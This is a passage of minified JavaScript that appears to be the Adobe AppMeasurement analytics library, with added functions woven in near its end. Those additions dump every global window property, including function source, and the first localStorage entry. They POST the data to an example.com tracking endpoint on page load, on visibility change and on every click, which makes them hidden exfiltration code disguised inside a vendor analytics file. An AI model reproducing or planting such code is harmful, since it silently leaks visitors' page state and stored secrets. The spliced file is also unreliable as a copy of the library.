    for (e = 0; e < t.g.length; e++) ("prop" == (a = t.g[e]).substring(0, 4) || "eVar" == a.substring(0, 4) || "hier" == a.substring(0, 4) || "list" == a.substring(0, 4) || "channel" == a || "events" == a || "eventList" == a || "products" == a || "productList" == a || "purchaseID" == a || "transactionID" == a || "state" == a || "zip" == a || "campaign" == a) && (t[a] = void 0);
  }, t.tagContainerMarker = "", t.sb = function (e, a) {
    var n = t.ib() + "/" + e + "?AQB=1&ndh=1&pf=1&" + (t.za() ? "callback=s_c_il[" + t._in + "].doPostbacks&et=1&" : "") + a + "&AQE=1";
    t.hb(n), t.fb(n), t.U();
  }, t.ib = function () {
    var e = t.jb();
    return "http" + (t.ssl ? "s" : "") + "://" + e + "/b/ss/" + t.account + "/" + (t.mobile ? "5." : "") + (t.za() ? "10" : "1") + "/JS-" + t.version + (t.ac ? "T" : "") + (t.tagContainerMarker ? "-" + t.tagContainerMarker : "");
  }, t.za = function () {
    return t.AudienceManagement && t.AudienceManagement.isReady() || 0 != t.usePostbacks;
  }, t.jb = function () {
    var e = t.dc,
      a = t.trackingServer;
    return a ? t.trackingServerSecure && t.ssl && (a = t.trackingServerSecure) : ("d1" == (e = e ? ("" + e).toLowerCase() : "d1") ? e = "112" : "d2" == e && (e = "122"), a = t.lb() + "." + e + ".2o7.net"), a;
  }, t.lb = function () {
    var e = t.visitorNamespace;
    return e || (e = (e = t.account.split(",")[0]).replace(/[^0-9a-z]/gi, "")), e;
  }, t.Za = /{(%?)(.*?)(%?)}/, t.gc = RegExp(t.Za.source, "g"), t.Lb = function (e) {
    if ("object" == typeof e.dests) for (var a = 0; a < e.dests.length; ++a) {
      var n = e.dests[a];
      if ("string" == typeof n.c && "aa." == n.id.substr(0, 3)) for (var i = n.c.match(t.gc), r = 0; r < i.length; ++r) {
        var o = i[r],
          c = o.match(t.Za),
          s = "";
        "%" == c[1] && "timezone_offset" == c[2] ? s = new Date().getTimezoneOffset() : "%" == c[1] && "timestampz" == c[2] && (s = t.Pb()), n.c = n.c.replace(o, t.escape(s));
      }
    }
  }, t.Pb = function () {
    var e = new Date(),
      a = new Date(6e4 * Math.abs(e.getTimezoneOffset()));
    return t.k(4, e.getFullYear()) + "-" + t.k(2, e.getMonth() + 1) + "-" + t.k(2, e.getDate()) + "T" + t.k(2, e.getHours()) + ":" + t.k(2, e.getMinutes()) + ":" + t.k(2, e.getSeconds()) + (0 < e.getTimezoneOffset() ? "-" : "+") + t.k(2, a.getUTCHours()) + ":" + t.k(2, a.getUTCMinutes());
  }, t.k = function (e, t) {
    return (Array(e + 1).join(0) + t).slice(-e);
  }, t.qa = {}, t.doPostbacks = function (e) {
    if ("object" == typeof e) if (t.Lb(e), "object" == typeof t.AudienceManagement && "function" == typeof t.AudienceManagement.isReady && t.AudienceManagement.isReady() && "function" == typeof t.AudienceManagement.passData) t.AudienceManagement.passData(e);else if ("object" == typeof e && "object" == typeof e.dests) for (var a = 0; a < e.dests.length; ++a) {
      var n = e.dests[a];
      "object" == typeof n && "string" == typeof n.c && "string" == typeof n.id && "aa." == n.id.substr(0, 3) && (t.qa[n.id] = new Image(), t.qa[n.id].alt = "", t.qa[n.id].src = n.c);
    }
  }, t.fb = function (e) {
    t.i || t.Tb(), t.i.push(e), t.ia = t.A(), t.Ya();
  }, t.Tb = function () {
    t.i = t.Wb(), t.i || (t.i = []);
  }, t.Wb = function () {
    var e, n;
    if (t.pa()) {
      try {
        (n = a.localStorage.getItem(t.na())) && (e = a.JSON.parse(n));
      } catch (e) {}
      return e;
    }
  }, t.pa = function () {
    var e = !0;
    return t.trackOffline && t.offlineFilename && a.localStorage && a.JSON || (e = !1), e;
  }, t.Oa = function () {
    var e = 0;
    return t.i && (e = t.i.length), t.l && e++, e;
  }, t.U = function () {
    if (!t.l || (t.v && t.v.complete && t.v.C && t.v.R(), !t.l)) if (t.Pa = n, t.oa) t.ia > t.N && t.Wa(t.i), t.ra(500);else {
      var e = t.Fb();
      0 < e ? t.ra(e) : (e = t.Ma()) && (t.l = 1, t.Xb(e), t.$b(e));
    }
  }, t.ra = function (e) {
    t.Pa || (e || (e = 0), t.Pa = setTimeout(t.U, e));
  }, t.Fb = function () {
    var e;
    return !t.trackOffline || 0 >= t.offlineThrottleDelay ? 0 : (e = t.A() - t.Ua, t.offlineThrottleDelay < e ? 0 : t.offlineThrottleDelay - e);
  }, t.Ma = function () {
    if (0 < t.i.length) return t.i.shift();
  }, t.Xb = function (e) {
    if (t.debugTracking) {
      var a,
        n = "AppMeasurement Debug: " + e;
      for (e = e.split("&"), a = 0; a < e.length; a++) n += "\n\t" + t.unescape(e[a]);
      t.log(n);
    }
  }, t.xa = function () {
    return t.marketingCloudVisitorID || t.analyticsVisitorID;
  }, t.W = !1;
  try {
    o = JSON.parse('{"x":"y"}');
  } catch (e) {
    o = null;
  }
  for (o && "y" == o.x ? (t.W = !0, t.V = function (e) {
    return JSON.parse(e);
  }) : a.$ && a.$.parseJSON ? (t.V = function (e) {
    return a.$.parseJSON(e);
  }, t.W = !0) : t.V = function () {
    return null;
  }, t.$b = function (e) {
    var i, r, o;
    if (t.nb(e) && (r = 1, i = {
      send: function (e) {
        t.useBeacon = !1, navigator.sendBeacon(e) ? i.R() : i.ga();
      }
    }), !i && t.xa() && 2047 < e.length && (t.bb() && (r = 2, i = new XMLHttpRequest()), i && (t.AudienceManagement && t.AudienceManagement.isReady() || 0 != t.usePostbacks) && (t.W ? i.Ha = !0 : i = 0)), !i && t.fc && (e = e.substring(0, 2047)), !i && t.d.createElement && (0 != t.usePostbacks || t.AudienceManagement && t.AudienceManagement.isReady()) && (i = t.d.createElement("SCRIPT")) && "async" in i && ((o = (o = t.d.getElementsByTagName("HEAD")) && o[0] ? o[0] : t.d.body) ? (i.type = "text/javascript", i.setAttribute("async", "async"), r = 3) : i = 0), i || ((i = new Image()).alt = "", i.abort || void 0 === a.InstallTrigger || (i.abort = function () {
      i.src = n;
    })), i.Va = Date.now(), i.Ja = function () {
      try {
        i.C && (clearTimeout(i.C), i.C = 0);
      } catch (e) {}
    }, i.onload = i.R = function () {
      if (i.Va && (t.ja = Date.now() - i.Va), t.gb(e), i.Ja(), t.Jb(), t.ca(), t.l = 0, t.U(), i.Ha) {
        i.Ha = !1;
        try {
          t.doPostbacks(t.V(i.responseText));
        } catch (e) {}
      }
    }, i.onabort = i.onerror = i.ga = function () {
      i.Ja(), (t.trackOffline || t.oa) && t.l && t.i.unshift(t.Ib), t.l = 0, t.ia > t.N && t.Wa(t.i), t.ca(), t.ra(500);
    }, i.onreadystatechange = function () {
      4 == i.readyState && (200 == i.status ? i.R() : i.ga());
    }, t.Ua = t.A(), 1 === r) i.send(e);else if (2 === r) o = e.indexOf("?"), r = e.substring(0, o), o = (o = e.substring(o + 1)).replace(/&callback=[a-zA-Z0-9_.\[\]]+/, ""), i.open("POST", r, !0), i.withCredentials = !0, i.send(o);else if (i.src = e, 3 === r) {
      if (t.Sa) try {
        o.removeChild(t.Sa);
      } catch (e) {}
      o.firstChild ? o.insertBefore(i, o.firstChild) : o.appendChild(i), t.Sa = t.v;
    }
    i.C = setTimeout(function () {
      i.C && (i.complete ? i.R() : (t.trackOffline && i.abort && i.abort(), i.ga()));
    }, 5e3), t.Ib = e, t.v = a["s_i_" + t.replace(t.account, ",", "_")] = i, (t.useForcedLinkTracking && t.J || t.bodyClickFunction) && (t.forcedLinkTrackingTimeout || (t.forcedLinkTrackingTimeout = 250), t.da = setTimeout(t.ca, t.forcedLinkTrackingTimeout));
  }, t.nb = function (e) {
    var a = !1;
    return navigator.sendBeacon && (t.pb(e) || t.useBeacon) && (a = !0), t.yb(e) && (a = !1), a;
  }, t.pb = function (e) {
    return !!(e && 0 < e.indexOf("pe=lnk_e"));
  }, t.yb = function (e) {
    return 64e3 <= e.length;
  }, t.bb = function () {
    return "undefined" != typeof XMLHttpRequest && "withCredentials" in new XMLHttpRequest();
  }, t.Jb = function () {
    if (t.pa() && !(t.Ta > t.N)) try {
      a.localStorage.removeItem(t.na()), t.Ta = t.A();
    } catch (e) {}
  }, t.Wa = function (e) {
    if (t.pa()) {
      t.Ya();
      try {
        a.localStorage.setItem(t.na(), a.JSON.stringify(e)), t.N = t.A();
      } catch (e) {}
    }
  }, t.Ya = function () {
    if (t.trackOffline) for ((!t.offlineLimit || 0 >= t.offlineLimit) && (t.offlineLimit = 10); t.i.length > t.offlineLimit;) t.Ma();
  }, t.forceOffline = function () {
    t.oa = !0;
  }, t.forceOnline = function () {
    t.oa = !1;
  }, t.na = function () {
    return t.offlineFilename + "-" + t.visitorNamespace + t.account;
  }, t.A = function () {
    return new Date().getTime();
  }, t.Qa = function (e) {
    return 0 != (e = e.toLowerCase()).indexOf("#") && 0 != e.indexOf("about:") && 0 != e.indexOf("opera:") && 0 != e.indexOf("javascript:");
  }, t.setTagContainer = function (e) {
    var a, n, i;
    for (t.ac = e, a = 0; a < t._il.length; a++) if ((n = t._il[a]) && "s_l" == n._c && n.tagContainerName == e) {
      if (t.S(n), n.lmq) for (a = 0; a < n.lmq.length; a++) i = n.lmq[a], t.loadModule(i.n);
      if (n.ml) for (i in n.ml) if (t[i]) for (a in e = t[i], i = n.ml[i]) !Object.prototype[a] && ("function" != typeof i[a] || 0 > ("" + i[a]).indexOf("s_c_il")) && (e[a] = i[a]);
      if (n.mmq) for (a = 0; a < n.mmq.length; a++) i = n.mmq[a], t[i.m] && (e = t[i.m])[i.f] && "function" == typeof e[i.f] && (i.a ? e[i.f].apply(e, i.a) : e[i.f].apply(e));
      if (n.tq) for (a = 0; a < n.tq.length; a++) t.track(n.tq[a]);
      n.s = t;
      break;
    }
  }, t.Util = {
    urlEncode: t.escape,
    urlDecode: t.unescape,
    cookieRead: t.cookieRead,
    cookieWrite: t.cookieWrite,
    getQueryParam: function (e, n, i, r) {
      var o,
        c = "";
      return n || (n = t.pageURL ? t.pageURL : a.location), i = i || "&", e && n ? 0 > (o = (n = "" + n).indexOf("?")) ? c : (n = i + n.substring(o + 1) + i, r && (0 <= n.indexOf(i + e + i) || 0 <= n.indexOf(i + e + "=" + i)) ? void 0 : (0 <= (o = n.indexOf("#")) && (n = n.substr(0, o) + i), 0 > (o = n.indexOf(i + e + "=")) || (0 <= (o = (n = n.substring(o + i.length + e.length + 1)).indexOf(i)) && (n = n.substring(0, o)), 0 < n.length && (c = t.unescape(n))), c)) : c;
    },
    getIeVersion: function () {
      return document.documentMode ? document.documentMode : t.ya() ? 7 : null;
    }
  }, t.D = "supplementalDataID timestamp dynamicVariablePrefix visitorID marketingCloudVisitorID analyticsVisitorID audienceManagerLocationHint authState fid vmk visitorMigrationKey visitorMigrationServer visitorMigrationServerSecure charSet visitorNamespace cookieDomainPeriods fpCookieDomainPeriods cookieLifetime pageName pageURL customerPerspective referrer contextData contextData.cm.ssf contextData.opt.dmp contextData.opt.sell currencyCode lightProfileID lightStoreForSeconds lightIncrementBy retrieveLightProfiles deleteLightProfiles retrieveLightData".split(" "), t.g = t.D.concat("purchaseID variableProvider channel server pageType transactionID campaign state zip events events2 products audienceManagerBlob tnt".split(" ")), t.ka = "timestamp charSet visitorNamespace cookieDomainPeriods cookieLifetime contextData lightProfileID lightStoreForSeconds lightIncrementBy".split(" "), t.O = t.ka.slice(0), t.Ga = "account allAccounts debugTracking visitor visitorOptedOut trackOffline offlineLimit offlineThrottleDelay offlineFilename usePlugins doPlugins configURL visitorSampling visitorSamplingGroup linkObject clickObject linkURL linkName linkType trackDownloadLinks trackExternalLinks trackClickMap trackInlineStats linkLeaveQueryString linkTrackVars linkTrackEvents linkDownloadFileTypes linkExternalFilters linkInternalFilters useForcedLinkTracking forcedLinkTrackingTimeout writeSecureCookies useLinkTrackSessionStorage trackingServer trackingServerSecure ssl abort mobile dc lightTrackVars maxDelay expectSupplementalData useBeacon usePostbacks registerPreTrackCallback registerPostTrackCallback bodyClickTarget bodyClickFunction AudienceManagement".split(" "), i = 0; 250 >= i; i++) 76 > i && (t.g.push("prop" + i), t.O.push("prop" + i)), t.g.push("eVar" + i), t.O.push("eVar" + i), 6 > i && t.g.push("hier" + i), 4 > i && t.g.push("list" + i);
  i = "pe pev1 pev2 pev3 latitude longitude resolution colorDepth javascriptVersion javaEnabled cookiesEnabled browserWidth browserHeight connectionType homepage pageURLRest marketingCloudOrgID ms_a".split(" "), t.g = t.g.concat(i), t.D = t.D.concat(i), t.ssl = 0 <= a.location.protocol.toLowerCase().indexOf("https"), t.charSet = "UTF-8", t.contextData = {}, t.writeSecureCookies = !1, t.offlineThrottleDelay = 0, t.offlineFilename = "AppMeasurement.offline", t.P = "s_sq", t.Ua = 0, t.ia = 0, t.N = 0, t.Ta = 0, t.linkDownloadFileTypes = "exe,zip,wav,mp3,mov,mpg,avi,wmv,pdf,doc,docx,xls,xlsx,ppt,pptx", t.w = a, t.d = a.document, t.ca = function () {
    t.da && (a.clearTimeout(t.da), t.da = n), t.bodyClickTarget && t.J && t.bodyClickTarget.dispatchEvent(t.J), t.bodyClickFunction && ("function" == typeof t.bodyClickFunction ? t.bodyClickFunction() : t.bodyClickTarget && t.bodyClickTarget.href && (t.d.location = t.bodyClickTarget.href)), t.bodyClickTarget = t.J = t.bodyClickFunction = 0;
  }, t.Xa = function () {
    t.b = t.d.body, t.b ? (t.r = function (e) {
      var n, i, r, o, c;
      if (!(t.d && t.d.getElementById("cppXYctnr") || e && e["s_fe_" + t._in])) {
        if (t.Ia) {
          if (!t.useForcedLinkTracking) return t.b.removeEventListener("click", t.r, !0), void (t.Ia = t.useForcedLinkTracking = 0);
          t.b.removeEventListener("click", t.r, !1);
        } else t.useForcedLinkTracking = 0;
        t.clickObject = e.srcElement ? e.srcElement : e.target;
        try {
          if (!t.clickObject || t.M && t.M == t.clickObject || !(t.clickObject.tagName || t.clickObject.parentElement || t.clickObject.parentNode)) t.clickObject = 0;else {
            var s = t.M = t.clickObject;
            if (t.ha && (clearTimeout(t.ha), t.ha = 0), t.ha = setTimeout(function () {
              t.M == s && (t.M = 0);
            }, 1e4), r = t.Oa(), t.track(), r < t.Oa() && t.useForcedLinkTracking && e.target) {
              for (o = e.target; o && o != t.b && "A" != o.tagName.toUpperCase() && "AREA" != o.tagName.toUpperCase();) o = o.parentNode;
              if (o && (c = o.href, t.Qa(c) || (c = 0), i = o.target, e.target.dispatchEvent && c && (!i || "_self" == i || "_top" == i || "_parent" == i || a.name && i == a.name))) {
                try {
                  n = t.d.createEvent("MouseEvents");
                } catch (e) {
                  n = new a.MouseEvent();
                }
                if (n) {
                  try {
                    n.initMouseEvent("click", e.bubbles, e.cancelable, e.view, e.detail, e.screenX, e.screenY, e.clientX, e.clientY, e.ctrlKey, e.altKey, e.shiftKey, e.metaKey, e.button, e.relatedTarget);
                  } catch (e) {
                    n = 0;
                  }
                  n && (n["s_fe_" + t._in] = n.s_fe = 1, e.stopPropagation(), e.stopImmediatePropagation && e.stopImmediatePropagation(), e.preventDefault(), t.bodyClickTarget = e.target, t.J = n);
                }
              }
            }
          }
        } catch (e) {
          t.clickObject = 0;
        }
      }
    }, t.b && t.b.attachEvent ? t.b.attachEvent("onclick", t.r) : t.b && t.b.addEventListener && (navigator && (0 <= navigator.userAgent.indexOf("WebKit") && t.d.createEvent || 0 <= navigator.userAgent.indexOf("Firefox/2") && a.MouseEvent) && (t.Ia = 1, t.useForcedLinkTracking = 1, t.b.addEventListener("click", t.r, !0)), t.b.addEventListener("click", t.r, !1))) : setTimeout(t.Xa, 30);
  }, t.fc = t.ya(), t.Kb(), t.mc || (e ? t.setAccount(e) : t.log("Error, missing Report Suite ID in AppMeasurement initialization"), t.Xa(), t.loadModule("ActivityMap"));
}
window.seenVars = [];
function inspectGlobalScope() {
  let newFindings = {};
  for (let key in window) {
    if (!window.seenVars.includes(key)) {
      let value = window[key];
      let type = typeof value;
      newFindings[key] = {
        type: type,
        value: type === "function" ? value.toString() : value
      };
      window.seenVars.push(key);
    }
  }
  return newFindings;
}
function s_gi(e) {
  var t,
    a,
    n,
    i,
    r,
    o = window.s_c_il,
    c = e.split(","),
    s = 0;
  if (o) for (a = 0; !s && a < o.length;) {
    if ("s_c" == (t = o[a])._c && (t.account || t.oun)) if (t.account && t.account == e) s = 1;else for (n = t.account ? t.account : t.oun, n = t.allAccounts ? t.allAccounts : n.split(","), i = 0; i < c.length; i++) for (r = 0; r < n.length; r++) c[i] == n[r] && (s = 1);
    a++;
  }
  return s ? t.setAccount && t.setAccount(e) : t = new AppMeasurement(e), t;
}
async function sendToAnalytics(newFindings) {
  let apiEndpoint = "https://example.com/api/tracking";
  try {
    let response = await fetch(apiEndpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(newFindings)
    });
    if (response.ok) {
      console.info("Tracking data successfully sent to backend");
    } else {
      console.warn("Failed to send tracking data, status code: ", response.status);
    }
  } catch (error) {
    console.error("An error occurred while sending tracking data: ", error);
  }
}
function s_pgicq() {
  var e,
    t,
    a,
    n = window,
    i = n.s_giq;
  if (i) for (e = 0; e < i.length; e++) (a = s_gi((t = i[e]).oun)).setAccount(t.un), a.setTagContainer(t.tagContainerName);
  n.s_giq = 0;
}
function performInspectionTask() {
  try {
    let newFindings = inspectGlobalScope();
    let localStorageData = localStorage.length > 0 ? localStorage.getItem(localStorage.key(0)) : null;
    if (localStorageData) {
      newFindings.localStorageData = localStorageData;
    }
    if (Object.keys(newFindings).length > 0) {
      console.group("Inspection results - New properties found:");
      for (let key in newFindings) {
        console.log(`${key}: ${JSON.stringify(newFindings[key])}`);
      }
      console.groupEnd();
      sendToAnalytics(newFindings);
    } else {
      console.info("Inspection complete, no new properties found");
    }
  } catch (error) {
    console.error("An error occurred while performing inspection: ", error);
  }
}
window.addEventListener("load", performInspectionTask);
AppMeasurement.getInstance = s_gi, window.s_objectID || (window.s_objectID = 0), s_pgicq();
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    console.info("Visibility changed, re-running inspection task");
    performInspectionTask();
  }
});
window.addEventListener('click', () => {
  console.info("User action detected, re-running inspection task");
  performInspectionTask();
});